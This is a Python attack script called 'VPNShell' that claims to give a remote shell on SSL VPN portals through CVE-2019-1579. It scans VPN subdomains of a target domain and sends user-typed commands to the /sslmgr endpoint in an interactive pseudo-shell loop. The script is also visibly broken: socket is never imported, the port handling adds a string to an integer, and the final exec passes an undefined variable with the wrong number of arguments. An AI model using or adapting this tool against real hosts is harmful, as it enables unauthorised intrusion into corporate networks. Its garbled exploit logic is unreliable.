import requests
import sys
import argparse

if sys.version_info < (3, 0):
    input = raw_input

requests.packages.urllib3.disable_warnings()


cvelist = ['CVE-2019-1579']
# Updating this list ...
vpnsub = ['vpn', 'covpn', 'tcovpn',
          'panvpn', 'vpn-blr', 'vpn-blr1',
          'vpn-west', 'vpn-east', 'vpn-sin',
          'vpn-cai', 'westvpn', 'eastvpn',
          'myvpn', 'privatevpn', 'pulsevpn',
          'palovpn']
red = '\033[1;31m'
white = '\033[1;m'
blue = '\033[1;34m'
green = '\033[1;32m'
if sys.platform == 'win32':
    white = red = white = blue = green = ''



banner = '''%s
 .  ..__ .  . __..     ..
 \  /[__)|\ |(__ |_  _ ||
  \/ |   | \|.__)[ )(/,||
                          V_1.0

%s''' % (blue, white)


parser = argparse.ArgumentParser(description='VPNShell 1.0: Pwn shell from SSL VPN service (portal)')
parser.add_argument('-s', help='local sorce address (or domain)', dest='host', default='')
parser.add_argument('-p', help='local port number (default: 443)', dest='port', default='')
parser.add_argument('-c', help='command to execute after got shell', dest='command', default='')
parser.add_argument('-n', help='scan the SSL VPN service', dest='scn', action='store_true')
parser.add_argument('-l', help='list of SSL VPN vulnerabilities', dest='lst', action='store_true')
parser.add_argument('-e', help='exploit 0day vulnerability', dest='cve', default='')

args = parser.parse_args()


cmd = format(args.command)
port = args.port
try:
    if len(str(port)):
        port = ':' + int(format(args.port))
except:
    print('Invalid port %s' % port)
    quit()
lst = args.lst
scn = args.scn
cve = args.cve
host = args.host

if not len(host) and lst == False:
    print('No host to pwn.')
    quit()



def cve_2019_1579(host, port):
    sign = '<msg>Invalid parameters</msg>'
    
    url = "https://%s%s/sslmgr" % (host, port)

    data = "scep-profile-name=whoami"
    wh = requests.post(url, data=data, verify=False).text.replace('\n', '')
    if not sign in wh and len(wh) < 50:
        print('Pwned shell from %s to %s' % (host, socket.gethostbyname()))
        print('')
        print('    - - - - - - - - -')
    else:
        print('The host %s is not vulnerable to CVE-2019-1579' % host)

    data = "scep-profile-name=cd"
    t = requests.post(url, data=data, verify=False).text.replace('\n', '')
    o = 'unix'
    if len(t) > 10:
        o = 'win'

    if o == 'win':
        data = "scep-profile-name=ver"
        r = requests.post(url, data=data, verify=False).text.replace('\n', '')
        crlf = '\n'
        print(r)
        print('(c) Microsoft Corporation. All rights reserved.')
        print('')
    else:
        data = "scep-profile-name=hostname"
        hostname = requests.post(url, data=data, verify=False).text.replace('\n', '')
        crlf = ''
        if wh == 'root':
            priv = '#'
        else:
            priv = '$'

    while 1:
        if o == 'win':
            data = "scep-profile-name=cd"
            d = requests.post(url, data=data, verify=False).text.replace('\n', '')
            i = '%s>' % d
        else:
            data = "scep-profile-name=pwd"
            d = requests.post(url, data=data, verify=False).text.replace('\n', '')
            if '/home/%s' % wh in d:
                pth = d.replace('/home/%s' % wh, '~')
            i = '%s%s@%s%s:%s%s%s%s ' % (green, wh, hostname, white, blue, pth, white, priv)

        buff = input(i)
        data = "scep-profile-name=%s" % buff
        r = requests.post(url, data=data, verify=False).text.replace('\n', '')
        print(r + crlf)


def scan(host):
    found = False
    for sub in vpnsub:
        url = 'https://%s.%s' % (sub, host)
        try:
            r = requests.get(url, verify=False, timeout=3)
            print('Found a SSL VPN service: %s%s%s' % (red, url.replace('https://', ''), white))
            found = True
        except:
            pass


print(banner)

if lst == True:
    print('List of SSL VPN 0day vulnerabilities in the database:')
    for x in cvelist:
        print(' - ' + x)
    print('')
    quit()
elif scn == True:
    print('Scanning for any %s SSL VPN service ...' % host)
    if scan(host) == False:
        print("Can't found any SSL VPN service for %s" % host)
    print('')
    quit()

if not cve.upper() in cvelist:
    print('No 0day exploit found for %s' % cve)
    quit()
else:
    exec('%s(host, port, secs)' % cve.lower().replace('-', '_'))

print('')
    
    

